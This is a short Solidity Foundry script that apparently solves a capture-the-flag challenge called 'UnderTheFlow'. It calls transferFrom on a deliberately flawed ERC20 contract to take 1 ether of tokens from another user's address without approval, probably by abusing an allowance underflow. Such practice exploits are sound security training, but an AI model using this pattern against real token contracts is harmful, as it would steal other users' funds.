// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;

import {Script, console} from "forge-std/Script.sol";
import {ImprovedERC20} from "../../src/03_UnderTheFlow/ImprovedERC20.sol";

contract ImprovedERC20_Solver is Script {
    
    uint8 constant DECIMALS = 18;
    uint256 constant INITIAL_SUPPLY = 100 ether;
    address otherUser;
    address user;
    uint256 userPrivate = vm.envUint("PRIVATE_KEY");

    function run() external {
        ImprovedERC20 erc20 = ImprovedERC20(
            vm.envAddress("CONTRACT")
        );

        user = address((vm.envAddress("USER")));
        otherUser = address((vm.envAddress("OTHER_USER")));
        
        vm.startBroadcast(userPrivate);
        erc20.transferFrom(otherUser, user, 1 ether);
        console.log("user balance: ", erc20.balanceOf(user));
        vm.stopBroadcast();
    }
}
